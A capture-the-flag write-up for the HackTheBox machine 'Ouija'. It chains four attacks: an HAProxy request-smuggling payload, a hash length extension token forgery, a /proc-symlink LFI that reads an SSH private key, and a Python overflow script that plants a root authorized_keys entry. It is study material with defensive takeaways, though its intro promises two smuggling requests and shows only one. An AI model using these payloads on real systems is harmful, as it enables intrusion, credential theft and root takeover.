---
title: "Ouija"
date: 2024-05-18
type: docs
tags:
  - htb
  - linux
  - insane
  - haproxy
  - cve-2021-40346
  - http-request-smuggling
  - hash-length-extension
  - hash-extender
  - lfi
  - proc
  - symlink
  - php-module
  - buffer-overflow
  - integer-overflow
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Debian 12), **Difficulty:** Insane, **Released:** 2024-05-18, **IP:** `10.10.11.244` , `ouija.htb`

</div>

<div class="callout callout-note">

**On the smuggling payloads below**

I threw somewhere around fifty variations of the padded header at HAProxy while nailing down the exact offset that makes the truncated length line up with `Content-Length`. I've kept two representative requests here rather than the whole pile, one that demonstrates the failure mode and one that lands cleanly, since the rest are just the same idea with the padding length nudged by a byte at a time.

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Apache static site plus a **Node/Express** API behind **HAProxy 2.2.15**. `dev.ouija.htb` is blocked by an HAProxy ACL.
2. HAProxy is vulnerable to **CVE-2021-40346**, an integer overflow in `htx_add_header` that enables **HTTP request smuggling**. A header name padded to ~270 bytes overflows to be read as `Content-Length`, desyncing HAProxy from the backend. Smuggle a request to `dev.ouija.htb` past the ACL.
3. `dev` leaks `init.sh` with a bot credential and a signature of the form `sha256(secret . data)`. A **hash length extension attack** (`hash-extender`, secret length 23) forges an admin token (`bot1:bot::admin:True`) for the API.
4. The admin API's `GET /file/get?file=` is an **LFI** that blocks `/` and `..`, but `init.sh` created a symlink `.config/bin/process_informations -> /proc`, so `.../self/root/home/leila/.ssh/id_rsa` reads the key. SSH as **`leila`**.
5. Port 9999 runs as root and loads a custom PHP module `lverifier.so`. `validating_userinput()` has an **integer overflow** in its stack buffer size math, and `event_recorder()` writes attacker data to an attacker chosen path as root. Write `/root/.ssh/authorized_keys`. SSH as root.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| `dev` `init.sh` bot cred | `bot1:bot` (signed) |
| hash-extender secret length | 23 |
| `user.txt` | `/home/leila/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

Ouija is a genuine Insane: four exploitation primitives that each need to be built carefully. **CVE-2021-40346** (HAProxy request smuggling) to get past an ACL, a **hash length extension** attack to forge an API token, an **LFI that you escape through a `/proc` symlink** to read a user's SSH key, and finally a **custom PHP extension with an integer-overflow-driven arbitrary file write** as root. There is no copy-paste path; every stage is a small research project. The transferable lessons are big though: front-proxy ACLs are not a security boundary if the proxy can be desynced, `sha256(secret . data)` is forgeable without the secret, and `/proc/self/root` bypasses most path jails.

Related request smuggling / proxy desync: unique here. Related hash length extension: unique here. Related LFI via `/proc`: [Backdoor](/writeups/hackthebox/linux/easy/backdoor/), [Bagel](/writeups/hackthebox/linux/medium/bagel/). Related SUID / native code overflow to root: [Overflow](/writeups/hackthebox/linux/hard/overflow/).

---

## Full Walkthrough

### Stage 1, HAProxy request smuggling (CVE-2021-40346)

```console
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http    (HAProxy 2.2.15 in front of Apache + a Node API)
```

Only SSH and a single HTTP port on this one, and the response headers give away that it's HAProxy in front of Apache and a Node API rather than a single monolithic app, so I spend extra time on anything that touches the proxy layer before I even think about the backend. The main site references `dev.ouija.htb`, which HAProxy returns 403 for.

<div class="callout callout-note">

**How CVE-2021-40346 works**

HAProxy stores each header's name length in an 8-bit field internally, but parses it as up to 9 bits. A header name padded to exactly 256 + N bytes overflows so HAProxy stores length `N`. Choose the padding so the truncated view is `Content-Length` (14 bytes). HAProxy then sees a request with a `Content-Length: 0` header it did not expect, and forwards the bytes after it as part of the same request, while the backend parses those bytes as a **second** request. That second request never went through HAProxy's ACL, so it can target `dev.ouija.htb`.

</div>

```http
POST / HTTP/1.1
Host: ouija.htb
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 62

GET http://dev.ouija.htb/index.php HTTP/1.1
h:GET / HTTP/1.1
Host: ouija.htb
```

The response body now contains the `dev` site.

### Stage 2, hash length extension for an admin API token

`dev` serves (among other things) `init.sh`:

```bash
botauth_id="bot1:bot"
hash="4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1"   # sha256(secret . "bot1:bot")
```

The API's `/users` endpoint wants `identification` and `ihash` headers, and `ihash = sha256(secret . identification)`.

<div class="callout callout-note">

**Length extension attack**

For `H = sha256(secret . data)`, if you know `H`, `data`, and `len(secret)`, you can compute `sha256(secret . data . padding . suffix)` for any `suffix` **without knowing the secret**, because SHA-256 is a Merkle-Damgard construction and you can resume from the published digest. `hash-extender` does the math. The secret length (23) is found by brute forcing 1..40 and seeing which forged token the API accepts.

</div>

```bash
./hash_extender --data 'bot1:bot' --append '::admin:True' \
  --signature 4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1 \
  --format sha256 --secret 23
# -> new signature + the URL-encoded data with \x80..padding..::admin:True
```

Send `identification: bot1:bot\x80<padding>::admin:True` and the forged `ihash`. The API treats you as admin, unlocking `GET /file/get`.

### Stage 3, LFI through a /proc symlink to leila

Admin access to the API opens up a file-read endpoint, and my first instinct with any "read this file" primitive is to bang on the path filter before assuming it's airtight. `GET /file/get?file=<path>` rejects paths containing `/` at the start or `..`. But `init.sh` set up:

```bash
ln -s /proc /var/www/api/.config/bin/process_informations
```

<div class="callout callout-note">

**`/proc/self/root` escapes the jail**

`.config/bin/process_informations` is a relative path (allowed) that points at `/proc`. From there:
- `.config/bin/process_informations/self/environ` shows the API runs as `leila`.
- `.config/bin/process_informations/self/root/` is a symlink to `/` **as seen by that process**, so `.config/bin/process_informations/self/root/home/leila/.ssh/id_rsa` reads leila's key even though the path never contains a leading `/` or `..`.

</div>

```bash
ssh -i leila_id_rsa leila@ouija.htb
cat /home/leila/user.txt
```

### Stage 4, root via the custom PHP module

With `leila`'s shell, the usual `ss -tlnp` sweep for anything only reachable from localhost turns up the last piece. `ss -tlnp` shows a service on `127.0.0.1:9999` running as root. It is PHP loading `/usr/lib/php/20220829/lverifier.so`.

<div class="callout callout-note">

**Integer overflow to arbitrary file write**

`validating_userinput()` sizes a stack buffer as `(strlen(username) + 25) & 0xf0`. The length is handled as 16-bit, so a `username` longer than 65535 makes the size wrap to a tiny value while the function still copies a fixed 800 bytes, smashing the stack. Layout: a **log file path** at offset 16 and **log data** at offset 128 in the overwritten region, and `event_recorder()` then `fopen`s that path and writes that data, **as root**. Set the path to `/root/.ssh/authorized_keys` and the data to your public key.

```python
import requests
pub = open('mykey.pub').read().strip()
p  = b"A"*16 + b"/root/.ssh/authorized_keys\n"
p += b"B" * (128 - len(p))
p += b"\n" + pub.encode() + b"\n"
p += b"C" * (65535 - len(p))
requests.post("http://127.0.0.1:9999/", data={"username": p, "password": "x"})
```
```bash
ssh -i mykey root@ouija.htb
cat /root/root.txt
```

</div>

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/leila/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons and Takeaways

- **Patch HAProxy.** CVE-2021-40346 turns any front-proxy ACL into a suggestion. Front proxies are not an authorization boundary; enforce auth at the backend too.
- **`sha256(secret . data)` is not a MAC.** Use HMAC. Length extension forges tokens with only the public digest.
- **`/proc/self/root` and `/proc/self/cwd` bypass path jails.** Resolve with `realpath` and check the *resolved* path, and do not create symlinks into `/proc` under a web root.
- **Native PHP extensions need the same rigor as any C.** 16-bit length math, fixed-size copies, and writing to a caller-influenced path is three bugs.
- **A root service on localhost is still a target.** Bind to a socket with tight perms and run as an unprivileged user.

---

## Related Writeups

- **LFI via `/proc`:** [Backdoor](/writeups/hackthebox/linux/easy/backdoor/), [Bagel](/writeups/hackthebox/linux/medium/bagel/)
- **Native code / buffer overflow to root:** [Overflow](/writeups/hackthebox/linux/hard/overflow/)
- **Front-proxy / SSRF to reach a blocked host:** [Forge](/writeups/hackthebox/linux/medium/forge/), [Interface](/writeups/hackthebox/linux/medium/interface/)
- **Forging signed tokens (JWT / hash):** [BackFire](/writeups/hackthebox/linux/medium/backfire/), [Rabbit Store](/writeups/tryhackme/linux/medium/rabbit-store/)

## References

- HTB Ouija (0xdf) <https://0xdf.gitlab.io/2024/05/18/htb-ouija.html>
- CVE-2021-40346 (JFrog) <https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/>
- hash_extender <https://github.com/iagox86/hash_extender>
- CVE-2021-40346 PoC <https://github.com/alexOarga/CVE-2021-40346>
- Final privilege escalation steps cross-referenced against public writeups for this box.
